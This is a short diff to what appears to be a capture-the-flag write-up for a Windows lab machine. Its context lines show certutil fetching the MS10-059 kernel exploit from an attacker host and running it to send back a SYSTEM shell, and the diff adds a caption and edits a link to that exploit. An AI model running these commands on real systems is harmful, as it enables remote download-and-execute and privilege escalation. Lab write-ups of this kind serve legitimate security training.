@@ -136,6 +136,8 @@ certutil.exe -urlcache -split -f "http://10.10.14.24/MS10-059.exe" MS10-059.exe
 MS10-059.exe 10.10.14.24 5555
 ```
 
+Get the shell as **nt authority\system**, and read the root flag:
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7d279287-cbd6-42b2-8a42-fa6be81d17b6)
 
 
@@ -145,7 +147,7 @@ MS10-059.exe 10.10.14.24 5555
 
 
 ## CVE Scripting
-+ **MS10–059?**
++ **MS10–059:**
     + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe 
 
 
